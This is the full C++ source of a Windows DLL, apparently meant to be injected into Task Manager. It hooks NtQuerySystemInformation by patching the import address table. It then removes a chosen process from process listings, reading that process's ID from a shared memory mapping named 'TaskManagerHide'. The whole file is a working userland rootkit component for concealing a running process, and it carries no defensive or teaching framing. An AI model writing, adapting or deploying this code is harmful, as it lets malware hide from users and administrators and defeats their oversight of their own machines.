#include <windows.h>
#include <winternl.h>
#include <string.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// credits to @thebowenfeng 
volatile DWORD g_hiddenPid = 0;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

static PNT_QUERY_SYSTEM_INFORMATION origNtQuerySysInfo = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

static NTSTATUS WINAPI hookNtQuerySysInfo(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS status = origNtQuerySysInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status && g_hiddenPid) {
        SYSTEM_PROCESS_INFORMATION* pCurrent = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
        while (pCurrent->NextEntryOffset != 0) {
            SYSTEM_PROCESS_INFORMATION* pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
            DWORD pid = (DWORD)(ULONG_PTR)pNext->UniqueProcessId;
            if (pid == g_hiddenPid)
                pCurrent->NextEntryOffset = pNext->NextEntryOffset ? pCurrent->NextEntryOffset + pNext->NextEntryOffset : 0;
            else
                pCurrent = pNext;
        }
    }
    return status;
}

static DWORD WINAPI MainThread(LPVOID) {
    HANDLE mapping = OpenFileMappingW(FILE_MAP_READ, FALSE, L"TaskManagerHide");
    DWORD* shared = (DWORD*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, sizeof(DWORD));
    for (;;) {
        g_hiddenPid = *shared;
        Sleep(220);
    }
    return 0;
}

static void InstallHook(void) {
    BYTE* base = (BYTE*)GetModuleHandleA(nullptr);
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)(base + dosHeader->e_lfanew);
    IMAGE_IMPORT_DESCRIPTOR* importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(base + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (importDescriptor->Characteristics) {
        if (strcmp("ntdll.dll", (char*)(base + importDescriptor->Name)) == 0) break;
        importDescriptor++;
    }
    if (!importDescriptor->Characteristics) return;
    IMAGE_THUNK_DATA* tableEntry = (IMAGE_THUNK_DATA*)(base + importDescriptor->OriginalFirstThunk);
    IMAGE_THUNK_DATA* IATEntry = (IMAGE_THUNK_DATA*)(base + importDescriptor->FirstThunk);
    while (!(tableEntry->u1.Ordinal & IMAGE_ORDINAL_FLAG) && tableEntry->u1.AddressOfData) {
        IMAGE_IMPORT_BY_NAME* funcName = (IMAGE_IMPORT_BY_NAME*)(base + tableEntry->u1.AddressOfData);
        if (strcmp("NtQuerySystemInformation", (char*)funcName->Name) == 0) break;
        tableEntry++;
        IATEntry++;
    }
    if (!tableEntry->u1.AddressOfData) return;
    DWORD oldProt = 0;
    VirtualProtect(&IATEntry->u1.Function, sizeof(uintptr_t), PAGE_READWRITE, &oldProt);
    IATEntry->u1.Function = (uintptr_t)hookNtQuerySysInfo;
    VirtualProtect(&IATEntry->u1.Function, sizeof(uintptr_t), oldProt, &oldProt);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        InstallHook();
        HANDLE h = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)MainThread, nullptr, 0, nullptr);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
